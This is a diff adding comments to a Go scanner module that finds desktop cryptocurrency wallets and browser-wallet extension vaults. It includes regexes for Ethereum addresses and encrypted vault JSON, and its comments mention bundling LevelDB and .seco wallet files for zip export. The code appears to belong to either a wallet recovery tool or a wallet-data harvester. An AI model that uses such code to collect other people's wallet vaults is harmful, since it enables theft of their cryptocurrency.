@@ -1,3 +1,8 @@
+// wallets.go — discover desktop wallet apps and browser-wallet vault traces.
+//
+// ScanWallets returns lightweight WalletResult metadata (paths, addresses).
+// Full LevelDB / .seco trees for zip export live in wallet_*_files.go and
+// wallets_darwin.go (CollectWalletExtensionBundles / CollectDesktopWalletBundles).
 package scanner
 
 import (
@@ -12,6 +17,7 @@ import (
 	"recovery/recovery/types"
 )
 
+// walletConfig maps a known wallet product to a path under a standard base dir.
 type walletConfig struct {
 	Name    string
 	SubPath string
@@ -21,9 +27,10 @@ type walletConfig struct {
 var ethAddrRe = regexp.MustCompile(`0x[0-9a-fA-F]{40}`)
 var vaultRe = regexp.MustCompile(`\{"data":"[A-Za-z0-9+/=]+","iv":"[A-Za-z0-9+/=]+","salt":"[A-Za-z0-9+/=]+(?:","lib":"[^"]*")?\}`)
 
-const maxFileReadSize = 10 * 1024 * 1024 // 10MB per file
+const maxFileReadSize = 10 * 1024 * 1024 // 10MB per file when mining addresses/vaults
 const maxAddresses = 50
 
+// ScanWallets combines desktop wallet paths with in-browser wallet extension data.
 func ScanWallets() []types.WalletResult {
 	var results []types.WalletResult
 	results = append(results, scanDesktopWallets()...)
